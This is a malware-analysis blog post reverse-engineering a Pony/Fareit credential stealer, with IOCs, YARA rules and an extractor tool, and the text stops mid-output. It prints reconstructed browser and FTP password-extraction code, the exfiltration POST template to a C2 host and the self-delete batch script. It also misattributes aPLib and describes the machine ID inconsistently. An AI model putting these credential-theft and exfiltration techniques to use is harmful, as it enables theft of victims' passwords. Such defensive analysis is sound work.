---
title: "Pony/Fareit: Inside the Credential Machine That Targeted 60+ FTP Clients"
permalink: /blog/pony-fareit-credential-machine/
date: 2026-04-17 00:00:00 +0000
categories: [malware-reversing, threat-intel]
tags: [pony, fareit, credential-stealer, loader, x86, pe32, md5, aplib, yara, idapython]
image:
  path: /assets/images/social/pony-fareit-2026.jpg
description: "Reverse-engineering a 2012-era Pony/Fareit credential stealer: the GetTickCount-mod-7 anti-emulation gate that stalls Speakeasy at 9,980 ticks, MD5-vs-API-hashing identification, and released Python and IDAPython tooling."
---

## The Setup

There is a particular kind of malware that does not try to be clever. It does not inject shellcode into lsass, does not abuse DCOM lateral movement, does not speak to its operator over an encrypted Tor circuit. Instead it does one thing with grinding, methodical efficiency: it reads every FTP client, every browser profile, every email account configuration it can find, packages the results, and ships them out over a raw TCP socket before deleting itself.

That is Pony, also known as Fareit and Siplog. It appeared around 2011 and for most of the following decade it was one of the most-distributed credential stealers in the underground market, sold as a kit with a PHP panel backend. The sample analyzed here was collected on 2026-04-17 from a local threat intel feed and caught my eye for two reasons: a capa risk score of 100 with 97 matched behavioral rules, and a fresh list of eleven compromised websites baked into its download array. Under the hood it is a well-worn Pony build — 92 KB, 32-bit x86, no packer — which makes it a clean specimen for walking through the family's internals end to end.

---

## Sample Properties

| Property | Value |
|---|---|
| SHA-256 | `805b1dbf373986fb98f346b491cea9ce75c44ea7cc55339260c344606773e236` |
| MD5 | `da49f65a4695a037b11df7f2c20444df` |
| SHA-1 | `94fd3ca6f5fccac582289bb01cf4a17e96f2e6ff` |
| Size | 92,160 bytes |
| Format | PE32 x86 GUI executable |
| Compile stamp | 2012-10-16 11:41:07 UTC (spoofed) |
| Imphash | `2c8567c932832b8c3359ddf9343a4028` |
| Sections | `.text` (6.07 entropy), `.rdata` (3.05), `.data` (5.42) |
| Packer | None; APLib v1.01 decompression library embedded |
| Image base | `0x00400000` |
| Entry point | `0x00410329` |

The compile timestamp is almost certainly false -- operators frequently set it to a date in 2012 to confuse triage tools -- but the code architecture and string corpus are consistent with Pony builds from the 2013-2016 era. The CAPA engine matched 97 behavioral rules against this sample and assigned a risk score of 100.

---

## Kill Chain

![Kill chain flowchart](/assets/images/posts/pony/kill-chain.png){: .image-centered }

```
Execution
  |
  +-- Anti-debug (PEB.BeingDebugged)
  |
  +-- HWID generation (CoCreateGuid + system survey)
  |
  +-- Credential harvest loop
  |     |-- FTP clients (~60 apps, registry + INI)
  |     |-- Browsers (Firefox NSS/SQLite, Chrome Login Data)
  |     |-- Email clients (Outlook, Thunderbird, The Bat! ...)
  |     `-- SSH/RDP (PuTTY sessions, TERMSRV/* DPAPI)
  |
  +-- Encrypt payload (rolling XOR keyed from HWID + MD5 integrity tag)
  |
  +-- HTTP POST to C2 (binary, MSIE 5.0 UA)
  |     `-- Expect: STATUS-IMPORT-OK
  |
  +-- Retrieve download list from compromised forums
  |
  +-- ShellExecuteA additional payloads
  |
  `-- Self-delete via abcd.bat
```

---

## Static Triage

### PE Header

The binary is a standard Win32 GUI application (subsystem 2). No overlay, no certificate, no manifest. The import directory references nine DLLs:

- `wsock32.dll` -- raw TCP socket communication
- `wininet.dll` -- `InternetCrackUrlA`, `InternetCreateUrlA` for URL parsing
- `advapi32.dll` -- registry CRUD and `GetUserNameA`
- `userenv.dll` -- `LoadUserProfileA` / `UnloadUserProfileA` (profile impersonation)
- `ole32.dll` -- `CoCreateGuid` (HWID seeding), `CoCreateInstance`
- `shell32.dll` -- `ShellExecuteA` (payload launch)
- `shlwapi.dll` -- string comparison helpers
- `kernel32.dll` -- file I/O, heap
- `user32.dll` -- `wsprintfA`

The `userenv.dll` pair is uncommon and worth noting: the malware loads a victim user profile to access credential stores that are protected under that user's security context, then unloads it when finished. This is what lets a single elevated Pony process harvest credentials for all local accounts in a shared environment.

### Sections and Entropy

```
Section   VA         Size     Entropy
.text     0x001000   71680    6.065
.rdata    0x013000     512    3.048
.data     0x014000   19456    5.419
```

The `.data` section at 5.42 entropy is elevated but not alarming. It holds the plaintext string table, the common-password list, and the FTP client registry key corpus -- over 4 KB of null-delimited target strings stored verbatim. The lack of obfuscation here is characteristic of Pony: the operator's kit prioritized code correctness over stealth in the data section.

### APLib Decompressor

The embedded string `aPLib v1.01 - the smaller the better :)` indicates that the decompressor from Igor Pavlov's APLib library is compiled into the binary. Pony uses this to unpack portions of credential template data at runtime; it does not wrap the entire executable.

---

## Anti-Analysis

### PEB.BeingDebugged Check

At `0x0040f759` the binary performs the classic inline PEB debugger check. Before we look at the code, a refresher on *why* this works and *where* the bytes come from. On 32-bit Windows, every thread's `FS` segment selector points at its Thread Environment Block (TEB), and the TEB contains a pointer to the per-process Process Environment Block (PEB). The relevant portion of the structure, as documented by Microsoft and reproduced in the Windows SDK:

```c
// MSDN / winternl.h (partial, offsets in bytes)
typedef struct _TEB {
    NT_TIB          NtTib;                    // +0x00
    // ...
    PVOID           ProcessEnvironmentBlock;  // +0x30  <-- PEB pointer
    // ...
} TEB;

typedef struct _PEB {
    BYTE            InheritedAddressSpace;    // +0x00
    BYTE            ReadImageFileExecOptions; // +0x01
    BYTE            BeingDebugged;            // +0x02  <-- set to 1 when a ring-3 debugger is attached
    BYTE            BitField;                 // +0x03
    // ...
} PEB;
```

When `CreateProcess` is called with `DEBUG_PROCESS` or a debugger attaches via `DebugActiveProcess`, the kernel flips `PEB.BeingDebugged` from `0x00` to `0x01`. Because FS on a user-mode thread is a flat segment based at the TEB, the single instruction `MOV EAX, FS:[0x30]` fetches the PEB pointer in one memory access, and `CMP BYTE PTR [EAX+2], 0` inspects the BeingDebugged byte.

Now the instructions at `0x0040f759`, byte-for-byte:

```nasm
;  ─── bytes ───                 ─── mnemonic ───
64 A1 30 00 00 00                mov  eax, dword ptr fs:[0x30]  ; EAX = TEB.ProcessEnvironmentBlock
80 78 02 00                      cmp  byte ptr [eax + 2], 0     ; PEB.BeingDebugged == 0 ?
74 08                            je   0x0040f76d                ; clean  -> jump over handler
FF 75 08                         push dword ptr [ebp + 8]       ; detected:
E8 B2 18 FF FF                   call 0x0040101f                ;   invoke shutdown handler
```

![PEB.BeingDebugged check in IDA disassembly](/assets/images/posts/pony/peb-being-debugged-check.png){: .image-centered }
_Figure: `fs:[0x30]` reads the TEB pointer (rendered symbolically after applying the `TEB_MIN` struct). The byte at PEB+2 is `PEB.BeingDebugged`. A non-zero value short-circuits into a shutdown handler at `0x0040101f`._

Byte-by-byte decoding of the first instruction is the part that trips up new analysts:

| Byte(s)          | Meaning                                                                 |
|------------------|-------------------------------------------------------------------------|
| `64`             | `FS:` segment-override prefix                                           |
| `A1`             | opcode for `MOV EAX, moffs32` (move dword from absolute offset into EAX)|
| `30 00 00 00`    | 32-bit little-endian offset `0x00000030`                                |

Concatenated with the segment prefix this becomes `MOV EAX, DWORD PTR FS:[0x30]`, which resolves to `TEB.ProcessEnvironmentBlock` per the structure above. The next instruction `80 78 02 00` is `CMP r/m8, imm8` with ModR/M `0x78` (base `[EAX]` + disp8) and disp8 `0x02` — i.e. `CMP BYTE [EAX+2], 0x00`, directly targeting `PEB.BeingDebugged`.

This is the simplest possible debugger check. It is trivially bypassed three ways:

1. **Static patch** the comparison immediate from `0x00` to `0x01` (change `80 78 02 00` to `80 78 02 01`), which inverts the gate.
2. **Runtime patch** the BeingDebugged byte itself after attach: `WriteProcessMemory(hProcess, PEB+2, "\x00", 1, NULL)`. Most mainstream debuggers (x64dbg, ScyllaHide, IDA's `BochsHelp`-style scripts) do this automatically.
3. **Use a ring-0 or emulator-based analysis harness** that never sets the flag in the first place.

Notably absent from this binary are hardware-breakpoint checks (`DR0`-`DR7` inspection), timing comparisons (`RDTSC` deltas), heap flag inspection (`NtGlobalFlag`, `HeapFlags`), or `NtQueryInformationProcess(ProcessDebugPort)`. The operator opted for a quick single-gate check rather than a layered anti-analysis routine, which keeps the binary compact but also means any modern sandbox that hooks `NtCreateProcess` sees the sample complete its execution path.

---

## Machine Fingerprinting

Before harvesting any credentials Pony calls `CoCreateGuid` and combines the result with system hardware information to produce a 128-bit Hardware ID:

{% raw %}
```c
// Reconstructed HWID generation flow
char hwid[64];
wsprintfA(hwid,
    "{%08X-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X}",
    guid.Data1, guid.Data2, guid.Data3,
    guid.Data4[0], guid.Data4[1],
    guid.Data4[2], guid.Data4[3],
    guid.Data4[4], guid.Data4[5],
    guid.Data4[6], guid.Data4[7]);
```
{% endraw %}

The HWID travels in every POST request as the `Client Hash` field, allowing the panel backend to deduplicate submissions from the same machine. Pony tries to stabilize the identifier in two stages: first it reads `HKCU\Software\WinRAR\HWID` (WinRAR writes a per-installation GUID there on first run), and only if that value is missing does it fall back to `CoCreateGuid`. The WinRAR fallback means a host that has ever had WinRAR installed will report a persistent ID across Pony executions; one that has not will report a fresh random GUID each time. This two-tier logic is consistent across Pony variants — Guillaume Orlando documented the same pattern on a 2017-era sample.

---

## Credential Harvesting

### FTP Clients (~60 Targets)

Pony's FTP harvesting is its most distinctive feature and the reason it became dominant in the era of web hosting exploitation. The binary contains a hand-rolled database of registry paths, INI file locations, and config file names for over sixty FTP clients:

```
FileZilla           \FileZilla\sitemanager.xml
TotalCommander      wcx_ftp.ini
FlashFXP            \FlashFXP\3\Sites.dat
WS_FTP              \Ipswitch\WS_FTP\*.ini
CuteFTP             \GlobalSCAPE\CuteFTP\sm.dat
SmartFTP            \SmartFTP\Favorites.dat
FTPVoyager          FTPVoyager.ftp / FTPVoyager.qc
WiseFTP             wiseftp.ini / wiseftpsrvs.ini
FTP Explorer        Software\FTP Explorer\Profiles
VanDyke SecureFX    \VanDyke\Config\Sessions
FTPRush             RushSite.xml
BitKinex            bitkinex.ds
ExpanDrive          \drives.js ("password" : "..." JSON)
NppFTP              \Notepad++\NppFTP.xml
Directory Opus      \SharedSettings.sqlite
Frigate3            .ini
LeapFTP             sites.dat
NetDrive            NDSites.ini
FFFTP               Software\Sota\FFFTP (CredentialSalt decryption)
CoreFTP             Software\FTPWare\COREFTP\Sites
```

For each client the harvester opens the credential store, reads host/user/password tuples, and appends them to an in-memory linked list. Passwords stored as `DPAPI` blobs are decrypted via the `CryptUnprotectData` API under the victim's security context. For FFFTP, which uses its own `CredentialSalt`-derived encryption, the binary includes a custom decryption stub.

### Browsers

Firefox credential extraction follows the documented NSS decryption path:

```c
// Dynamic resolution via LoadLibrary("nss3.dll")
NSS_Init(profile_path);
slot = PK11_GetInternalKeySlot();
PK11_Authenticate(slot, PR_TRUE, NULL);

// Query signons.sqlite (Firefox < 32) or logins.json (newer)
sqlite3_prepare(db,
    "SELECT hostname, encryptedUsername, encryptedPassword "
    "FROM moz_logins", -1, &stmt, NULL);

while (sqlite3_step(stmt) == SQLITE_ROW) {
    blob = sqlite3_column_blob(stmt, 2); // encryptedPassword
    PK11SDR_Decrypt(&blob_item, &decrypted_item, NULL);
    // decrypted_item.data now contains plaintext password
}
```

The binary also tries `signons.txt`, `signons2.txt`, and `signons3.txt` as fallback paths for very old Firefox versions.

Chrome-family browsers are handled by locating `%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data`, opening the SQLite file, and querying the `logins` table:

```sql
SELECT origin_url, username_value, password_value FROM logins
```

The `password_value` field holds a DPAPI-encrypted blob on Windows, decrypted via `CryptUnprotectData`. The same logic applies to Chromium, ChromePlus, Bromium, Nichrome, Comodo Dragon, RockMelt, K-Meleon, Epic, and Yandex Browser -- all share the same Chrome credentials storage format.

### Email Clients

Outlook and Windows Mail credentials are extracted from the registry:

```
HKCU\Software\Microsoft\Internet Account Manager\Accounts\<n>
  POP3 Password2   (DPAPI-protected DWORD blob)
  SMTP Password2
  IMAP Password2
```

Thunderbird uses the same NSS decryption path as Firefox. The Bat! stores credentials in `account.cfg` and `account.cfn` files under `%APPDATA%\BatMail` and `%APPDATA%\The Bat!`. IncrediMail keeps them in registry keys under `Software\IncrediMail`.

### SSH and RDP

PuTTY saved sessions are read from:

```
HKCU\Software\SimonTatham\PuTTY\Sessions\<session_name>
  HostName
  UserName
  Password   (PuTTY stores this in plaintext if "Remember password" is set)
```

For RDP the malware calls `CredEnumerate` with a target filter of `TERMSRV/*` to retrieve cached Windows Credential Manager entries. The `full address:s:` and `username:s:` fields from RDP `.rdp` files are also parsed if present in the user's Documents or Desktop folders.

---

## Entry-Point Anti-Emulation

Before any credential logic runs, the binary passes through a small anti-emulation gate that is worth understanding because it is also what stopped the Speakeasy emulator in its tracks (9,980 `GetTickCount` calls before bail-out).

The `AddressOfEntryPoint` points at `0x00410329`, but that block is a 12-byte no-op-then-ret trampoline:

```nasm
0x00410329   50            push eax
0x0041032a   58            pop  eax
0x0041032b   68 35 03 41 00  push 0x00410335   ; real target
0x00410330   f8            clc                ; CF = 0
0x00410331   72 01         jb   0x00410334    ; never taken (CF=0)
0x00410333   c3            ret                ; pops 0x00410335 -> jumps there
```

Simple anti-disassembly: `clc + jb` is a deterministic "never taken" branch, and the `ret` at `0x00410333` returns to the value that was pushed just before. Static disassemblers that do not fold the flag logic will treat the `jb` as a real edge and waste analysis on the dead branch at `0x00410334`. This same `push <addr>; clc; jb +1; ret` idiom is used as an indirect-call primitive throughout the binary.

![Entry-point trampoline — push/pop/push-clc-jb-ret](/assets/images/posts/pony/anti-disassembly.png){: .image-centered }
_Figure: the 12-byte entry stub. The `jb +1` after `clc` is architecturally unreachable; the `ret` pops the pushed constant `0x00410335` and transfers control there._

The real first instruction is at `0x00410335`:

```nasm
0x00410335   e8 38 01 00 00    call 0x00410472   ; GetTickCount
0x0041033a   b9 07 00 00 00    mov  ecx, 7
0x0041033f   33 d2             xor  edx, edx
0x00410341   f7 f1             div  ecx
0x00410343   83 fa 05          cmp  edx, 5
0x00410346   75 02             jne  0x0041034a
0x00410348   eb 02             jmp  0x0041034c   ; pass -> real main
0x0041034a   eb e9             jmp  0x00410335   ; fail -> loop back
```

![GetTickCount anti-emulation gate](/assets/images/posts/pony/anti-emulation.png){: .image-centered }
_Figure: the `GetTickCount` / `mod 7 == 5` gate. `jne` jumps back to the call on failure, creating a tight spin-loop that only exits when the residue happens to be 5._

Read in English: *loop calling GetTickCount until (GetTickCount() mod 7) == 5*. On a real machine, `GetTickCount` returns a monotonically increasing millisecond counter, so `mod 7` is effectively uniform and the loop exits in a few microseconds on average. On an emulator that stubs `GetTickCount` to return a constant (or an incrementing-by-1 value that never aligns at residue 5), the loop runs until the sandbox timeout fires. The Speakeasy report for this sample shows exactly that pattern:

```
kernel32.GetTickCount  count=9980
runtime_seconds=6.052
file_events=[] http_events=[] registry_events=[] process_creates=[]
```

Nine thousand nine hundred eighty consecutive tick reads, zero observable behaviour, six seconds of wasted emulator CPU. The credential logic never executes.

Defeating this is a one-byte patch -- change `cmp edx, 5` to `cmp edx, edx` -- or a hook that makes `GetTickCount` return real wall-clock time. The trick is quaint by modern standards but remains effective against cheap sandbox deployments that serve static tick values.

---

## Cryptography

Static triage of this sample reveals **three** cryptographic primitives compiled into the binary: MD5, a byte-counted XOR obfuscator, and the APLib decompressor with its copyright-string integrity check. CAPA's initial finding of "DES encryption" turned out to be a false positive against the embedded common-password word list; there is no DES in this build.

### MD5 Transform (fcn.00402d3e)

The 1,555-byte function at `0x00402d3e` is a textbook MD5 block-compression routine. The four round constants are the giveaway (first and last of each round shown):

```
Round 1 (F):  0xd76aa478, 0xe8c7b756, ..., 0x895cd7be, 0x6b901122
Round 2 (G):  0xf61e2562, 0xc040b340, ..., 0x676f02d9, 0x8d2a4c8a
Round 3 (H):  0xfffa3942, 0x8771f681, ..., 0xbd3af235, 0x2ad7d2bb
Round 4 (I):  0xf4292244, 0x432aff97, ..., 0x85845dd1, 0xeb86d391
```

And the four IV words are stored adjacent to the function at `0x00402d01`:

```
0x67452301  0xefcdab89  0x98badcfe  0x10325476
```

The rotation schedule (7/12/17/22, 5/9/14/20, 4/11/16/23, 6/10/15/21) is visible in the decompiled output as multipliers of the form `uVar * 0x80 | uVar >> 0x19` which is a `ROL 7` expressed arithmetically.

![md5_transform pseudocode after struct + enum application](/assets/images/posts/pony/md5-transform.png){: .image-centered }
_Figure: the compression function at `0x00402D3E` rendered in Hex-Rays after applying `MD5_STATE*` and the `MD5_T_CONST` enum. The T-table constants read as `T1`, `T2`, ... instead of raw hex, and the SSA temporaries have been renamed to follow the a/d/c/b rotation pattern of RFC 1321 — making it readable at a glance as MD5 and not, say, API hashing._

![MD5 IV constants at 0x00402D01](/assets/images/posts/pony/md5-iv-proof.png){: .image-centered }
_Figure: the four DWORDs immediately preceding `md5_transform` are the textbook MD5 initial state (A=0x67452301, B=0xEFCDAB89, C=0x98BADCFE, D=0x10325476) — the cleanest possible proof of identification._

MD5 is used for two purposes in Pony: mixing the `CoCreateGuid` output into a stable HWID checksum, and hashing password candidates during the brute-force phase (see next section).

### APLib Integrity Check

The function at `0x0041113d` initialises the APLib decompressor state, but before it zeros the 256 KB dictionary buffer it computes a rolling hash over the first 256 bytes of the APLib copyright banner:

```c
uint32_t hash = 0xabeefbee;
for (int i = 0; i < 256; i++)
    hash = rol1(hash) ^ aplib_banner[i];
if (hash != 0) return 0;   // tamper -> bail out
```

This is a self-integrity check disguised as a banner reference. Any analyst who patches the APLib copyright string (for example, to redirect decompression through a hook) will flip the hash away from zero and the function will refuse to initialise -- silently killing the later credential-logic stages. It is a small but deliberate anti-tamper measure.

![APLib banner integrity check](/assets/images/posts/pony/self-tamper-protection.png){: .image-centered }
_Figure: the rolling-hash loop over the APLib v1.01 copyright string. The banner text is inlined into the pseudocode because it is referenced as data, not as a message; the `if (hash != 0) return 0;` guard at the bottom is the tamper trap._

### XOR Transport Obfuscation

The same byte-counted XOR routine CAPA flagged at `0x00401c20` / `0x004034b6` / `0x004035b1` wraps the credential report before transmission. It uses the classic hacker's-delight null-byte scanner (subtract `0x01010101`, and-not `0x80808080`) to find string terminators, then XORs each byte with a rolling key derived from the build's hardcoded seed mixed with the per-session HWID. Because the key depends on the runtime HWID, two captured POST bodies from two different victims will look unrelated at the byte level even if they report identical credentials.

This is the only encryption layer applied before the HTTP POST. There is no DES, no AES, no RC4. The wire format for this build is effectively `XOR(credential_blob, hwid_derived_key)`.

### HTTP POST Exfiltration

The assembled, encrypted credential package is transmitted over a raw TCP socket established via `wsock32.dll`.

![TCP socket creation with AF_INET / SOCK_STREAM / IPPROTO_TCP](/assets/images/posts/pony/tcp-socket-creation.png){: .image-centered }
_Figure: `push 6 / push 1 / push 2 / call socket` — the three literal pushes are AF_INET, SOCK_STREAM, and IPPROTO_TCP. Classic TCP socket creation._

![pony_tcp_connect pseudocode](/assets/images/posts/pony/tcp-c2-establishment.png){: .image-centered }
_Figure: the TCP connect helper builds a `sockaddr_in`, resolves the host via `gethostbyname`, and connects. Applied types make `sin_family`, `sin_port`, and `sin_addr` render as field names rather than stack offsets._

The request itself looks like this:

```
POST /gate.php HTTP/1.0
Host: <c2_host>
Accept: */*
Accept-Encoding: identity, *;q=0
Content-Length: <n>
Connection: close
Content-Type: application/octet-stream
Content-Encoding: binary
User-Agent: Mozilla/4.0 (compatible; MSIE 5.0; Windows 98)

<XOR(credentials_blob, hwid_derived_key)>
```

The server acknowledges successful ingestion by returning the string `STATUS-IMPORT-OK` in the response body. On any other response -- timeout, connection refused, unexpected body -- the malware proceeds directly to the download phase without retrying.

The User-Agent `Mozilla/4.0 (compatible; MSIE 5.0; Windows 98)` is one of the most reliable Pony network indicators. It has not changed across dozens of variants spanning a decade and is trivially blocked at any HTTP proxy.

---

## Loader Functionality

After exfiltrating credentials, Pony shifts into loader mode. It performs an HTTP GET against two "dead drop" URLs that resolve to compromised phpBB forum installations:

```
hxxp://o[.]casasferiasacores[.]org/forum/viewtopic.php
hxxp://o[.]cutanddrop[.]com/forum/viewtopic.php
```

The forum page contains an operator-controlled thread body with one download URL per line. This indirect configuration mechanism lets the operator rotate payloads without recompiling the stager binary. In this build the download list is also partially hardcoded (eleven URLs embedded as plaintext strings) as a fallback:

```
hxxp://ipsiamarcora[.]it/9mMBpnGo.exe
hxxp://nuttytheory[.]com/B5ty.exe
hxxp://034c695[.]netsolhost[.]com/a1oep.exe
hxxp://www[.]webspace-lilly[.]rivido[.]de/Zpv3.exe
hxxp://infojerte[.]com/suJcZGL.exe
hxxp://cauplastic[.]com/V38T2Yx.exe
hxxp://joeckel[.]net/Wmw.exe
hxxp://www[.]integritymoving[.]ca/NzJYh.exe
hxxp://serapmodaevi[.]com/rpHrcVZ4.exe
hxxp://mwc-parts[.]nl/XNdb.exe
hxxp://www[.]proyectosweb[.]cl/Z6u.exe
```

All eleven domains are legitimate sites that were compromised and used as staging servers. The payloads are downloaded as numbered files (`%d.exe`) to a temp directory and launched via `ShellExecuteA`.

![Dead-drop C2 URLs embedded in .data](/assets/images/posts/pony/dead-drop-c2.png){: .image-centered }
_Figure: both `viewtopic.php` dead-drop URLs stored verbatim in the `.data` section. The operator pays no obfuscation cost for these — they are plaintext in the hex view._

### Brute-Force Password List

Immediately after the APLib dictionary buffer in `.data`, at file offset `0x11bdc` (VA `0x00412bdc`), is a null-delimited list of exactly **256 common passwords**. This is not an artefact of some previously-captured victim; it is a hardcoded dictionary that Pony uses for online brute-force attempts against accounts it failed to extract cleartext credentials for. The list begins:

```
123456, password, phpbb, qwerty, 12345, jesus, 12345678, 1234, abc123,
letmein, test, love, 123, password1, hello, monkey, dragon, trustno1,
111111, iloveyou, 1234567, shadow, 123456789, christ, sunshine,
master, computer, princess, tigger, football ...
```

and ends with a sequence that is revealing about the operator's background:

```
... jasper, danielle, kitten, cassie, stella, prayer, hotdog,
windows, mustdie, gates, billgates, ghbdtn, gfhjkm, 1234567890, et{rvkornwu
```

`ghbdtn` and `gfhjkm` are the strings `привет` ("hello") and `пароль` ("password") typed on an English keyboard with the Cyrillic keyboard layout active -- a reliable tell for a Russian-speaking author or source corpus. `mustdie` and `billgates` are the hacker-culture anti-Microsoft shibboleths that have appeared in Russian-market malware dictionaries since the late 1990s. The final entry `et{rvkornwu` is mapped through the same Russian/English swap but does not decode to a known word; it is either an operator signature or a hash collision placeholder.

The MD5 routine identified earlier is the consumer of this list: for each captured hashed credential, Pony iterates the 256 candidates, hashes them with MD5, and checks for a match. This is a crude but effective rainbow-table-on-the-fly for the small number of accounts where only a hash was recovered.

### Self-Deletion

Pony drops and executes `abcd.bat` to clean up after itself. The batch file implements a wait loop that retries deletion until the PE lock is released:

```batch
:ijk
 del   %1
 if  exist   %1   goto  ijk
 del  %0
```

Excessive whitespace and tab characters in the batch source are a deliberate obfuscation to confuse simple string matching. The script is invoked as `ShellExecuteA("open", "abcd.bat", argv[0], ...)`, passing the stealer's own path as `%1`.

---

## Code Weaknesses

The operator who deployed this build made several choices that significantly weaken its operational security:

1. **Plaintext C2 URLs.** Both the forum dead drops and all eleven payload download URLs are stored verbatim in the `.data` section. Any analyst with a hex editor can extract the full C2 infrastructure without executing the sample.

2. **Cleartext HTTP exfiltration.** The POST body is only wrapped in the HWID-keyed XOR layer and transmitted over HTTP/1.0. Any network tap between the victim and the C2 server captures the full credential stream and, because the `Client Hash` field travels in the same request, an interceptor can re-derive the XOR key and recover plaintext without running a single instruction of the malware.

3. **Static User-Agent.** `Mozilla/4.0 (compatible; MSIE 5.0; Windows 98)` has been a known Pony indicator since at least 2013. Any proxy or IDS with a single signature rule will drop every C2 connection this binary initiates.

4. **Session-scoped HWID.** Because `CoCreateGuid` generates a fresh random value each run, re-execution of the binary creates a duplicate victim record in the panel. This is a noise problem for the operator and makes the victim list unreliable.

5. **XOR is the only transport encryption.** There is no DES, AES, or RC4 anywhere in the binary -- just a rolling XOR keyed from the session HWID. A captured POST body combined with a captured HWID recovers the plaintext credentials instantly.

6. **APLib banner integrity check is cosmetic.** The self-tamper check over the APLib copyright string protects against clumsy in-place patching but does nothing against any modern dynamic-analysis pipeline that hooks rather than modifies.

7. **Entry anti-emulation gate loops forever on dumb sandboxes but is trivially defeated with one patch.** Change `cmp edx, 5` to `cmp edx, edx` and the gate passes on the first iteration. Any Unicorn/Qiling harness that models `GetTickCount` as returning real time also defeats it without patching.

8. **Predictable batch artifact.** The filename `abcd.bat` and its tab-padded syntax are specific enough to generate a high-confidence YARA hit without inspecting the PE itself.

---

## IOC Appendix

### Hashes

| Type | Value |
|---|---|
| SHA-256 | `805b1dbf373986fb98f346b491cea9ce75c44ea7cc55339260c344606773e236` |
| SHA-1 | `94fd3ca6f5fccac582289bb01cf4a17e96f2e6ff` |
| MD5 | `da49f65a4695a037b11df7f2c20444df` |

### C2 / Dead Drop URLs (defanged)

```
hxxp://o[.]casasferiasacores[.]org/forum/viewtopic[.]php
hxxp://o[.]cutanddrop[.]com/forum/viewtopic[.]php
```

### Payload Download URLs (defanged)

```
hxxp://ipsiamarcora[.]it/9mMBpnGo.exe
hxxp://nuttytheory[.]com/B5ty.exe
hxxp://034c695[.]netsolhost[.]com/a1oep.exe
hxxp://www[.]webspace-lilly[.]rivido[.]de/Zpv3.exe
hxxp://infojerte[.]com/suJcZGL.exe
hxxp://cauplastic[.]com/V38T2Yx.exe
hxxp://joeckel[.]net/Wmw.exe
hxxp://www[.]integritymoving[.]ca/NzJYh.exe
hxxp://serapmodaevi[.]com/rpHrcVZ4.exe
hxxp://mwc-parts[.]nl/XNdb.exe
hxxp://www[.]proyectosweb[.]cl/Z6u.exe
```

### Registry Indicators

```
SOFTWARE\Classes\TypeLib\{CB1F2C0F-8094-4AAC-BCF5-41A64E27F777}
SOFTWARE\Classes\TypeLib\{9EA55529-E122-4757-BC79-E4825F80732C}
SOFTWARE\Classes\TypeLib\{F9043C88-F6F2-101A-A3C9-08002B2F49FB}
```

### Behavioral Indicators

| Indicator | Description |
|---|---|
| `abcd.bat` dropped to temp | Self-delete batch script |
| HTTP POST `Content-Type: application/octet-stream` with UA `MSIE 5.0; Windows 98` | C2 exfiltration request |
| HTTP response body `STATUS-IMPORT-OK` | Successful credential ingestion |
| `nss3.dll` loaded dynamically | Firefox credential decryption |
| `sqlite3.dll` / `mozsqlite3.dll` loaded dynamically | Browser credential extraction |

---

## MITRE ATT&CK Mapping

| Technique ID | Name |
|---|---|
| T1555 | Credentials from Password Stores |
| T1555.003 | Credentials from Web Browsers |
| T1552.002 | Unsecured Credentials: Credentials in Registry |
| T1071.001 | Application Layer Protocol: Web Protocols |
| T1027 | Obfuscated Files or Information |
| T1140 | Deobfuscate/Decode Files or Information |
| T1105 | Ingress Tool Transfer |
| T1059.003 | Windows Command Shell |
| T1547.001 | Registry Run Keys / Startup Folder |
| T1082 | System Information Discovery |
| T1083 | File and Directory Discovery |
| T1012 | Query Registry |
| T1070.004 | Indicator Removal: File Deletion |
| T1497 | Virtualization/Sandbox Evasion |
| B0001.035 | MBC: Debugger Detection -- PEB BeingDebugged |

---

## YARA Rules

```text
import "pe"

rule Pony_Stealer_Credential_Harvester
{
    meta:
        author      = "Tao Goldi"
        version     = 1
        description = "Detects Pony/Fareit credential stealer based on static indicators"
        sha256      = "805b1dbf373986fb98f346b491cea9ce75c44ea7cc55339260c344606773e236"
        reference   = "https://taogoldi.github.io/reverse-engineer/"

    strings:
        $s1  = "STATUS-IMPORT-OK" ascii
        $s2  = "Client Hash" ascii
        $s3  = "HWID" ascii
        $s4  = "abcd.bat" ascii
        $s5  = "Mozilla/4.0 (compatible; MSIE 5.0; Windows 98)" ascii
        $s6  = "Content-Encoding: binary" ascii
        $s7  = "NSS_Init" ascii
        $s8  = "PK11SDR_Decrypt" ascii
        $s9  = "sqlite3_open" ascii
        $s10 = "moz_logins" ascii
        $s11 = "%d.exe" ascii
        $s12 = "forum/viewtopic.php" ascii

    condition:
        uint16(0) == 0x5A4D
        and pe.is_32bit()
        and filesize < 300KB
        and (
            ($s1 and $s2 and $s4 and $s5)
            or ($s7 and $s8 and ($s9 or $s10) and $s6)
            or ($s1 and $s11 and $s12)
        )
        and 6 of ($s*)
}

rule Pony_Stealer_HTTP_Protocol
{
    meta:
        author      = "Tao Goldi"
        version     = 1
        description = "Detects Pony/Fareit binary exfiltration HTTP fingerprint"

    strings:
        $http_post = "Content-Type: application/octet-stream" ascii
        $encoding  = "Content-Encoding: binary" ascii
        $ua        = "MSIE 5.0; Windows 98" ascii
        $ok        = "STATUS-IMPORT-OK" ascii

    condition:
        uint16(0) == 0x5A4D
        and all of them
}
```

---

## Tools Released with This Post

Rather than leave the analysis as prose, the artefacts that produced it are published alongside the write-up so another analyst can reproduce, adapt, or extend the work on a new sample in minutes rather than days.

### `pony_config_extractor.py` — one-shot static extractor

A single-file Python 3 script (`pefile` only) that takes a Pony PE and prints — or optionally emits as JSON — everything needed to triage a new build from this family: dead-drop URLs, payload-download URLs, User-Agent, ack token, POST/GET templates, HWID format, entry-point anti-emulation gate parameters, and the full enumerated target list of FTP clients, email clients, and browsers.

What makes it useful is that it **auto-detects the `GetTickCount` anti-emulation gate's modulus** rather than hardcoding it. For this sample that means it correctly reports `mod 7 == 5`; against the leaked Pony 2.0 build it would report `mod 10 == 5`; against any future mutation that flips the constant again it would pick up the new value without code changes. That detection is driven by a regex over the entry-stub byte sequence `E8 ?? ?? ?? ?? B9 XX 00 00 00 33 D2 F7 F1 83 FA YY` where `XX` is the modulus and `YY` is the expected residue.

Running it against the sample analysed in this post:

```bash
$ python3 pony_config_extractor.py 805b1dbf...e236.exe
====================================================================
Pony/Fareit config extractor — 805b1dbf...e236.exe
====================================================================
SHA-256   : 805b1dbf373986fb98f346b491cea9ce75c44ea7cc55339260c344606773e236
MD5       : da49f65a4695a037b11df7f2c20444df
ImageBase : 0x400000
EntryPoint: 0x410329

--- Entry-point anti-emulation ---
  Bytes at EP: 50586835034100f87201c3ffe8380100
